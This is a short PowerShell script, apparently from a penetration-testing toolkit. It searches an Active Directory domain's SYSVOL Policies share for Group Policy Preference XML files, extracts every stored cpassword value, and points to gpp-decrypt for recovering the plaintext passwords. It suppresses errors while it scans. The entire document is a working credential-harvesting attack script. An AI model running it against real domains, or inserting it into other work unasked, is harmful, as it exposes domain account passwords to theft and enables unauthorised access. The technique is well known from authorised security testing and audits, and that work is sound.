# gpp_password — cpassword hunt across SYSVOL (legacy GPP credential dump)
# OCD mindmap: Low hanging fruit / GPP
$ErrorActionPreference = 'SilentlyContinue'

$sysvol = "\\$env:USERDNSDOMAIN\SYSVOL\$env:USERDNSDOMAIN\Policies"
Write-Host "Scanning: $sysvol"

$xmlFiles = Get-ChildItem -Path $sysvol -Recurse -Include `
    'Groups.xml','Services.xml','Scheduledtasks.xml','DataSources.xml','Printers.xml','Drives.xml' `
    -ErrorAction SilentlyContinue

if (-not $xmlFiles) {
    Write-Host "No GPP XML files readable"
    return
}

foreach ($f in $xmlFiles) {
    $c = Get-Content $f.FullName -Raw -ErrorAction SilentlyContinue
    if ($c -match 'cpassword="[^"]+"') {
        Write-Host "=== $($f.FullName) ==="
        $matches = [regex]::Matches($c, 'cpassword="([^"]+)"')
        foreach ($m in $matches) {
            Write-Host "cpassword: $($m.Groups[1].Value)"
            Write-Host "  (decrypt with gpp-decrypt on Kali)"
        }
    }
}
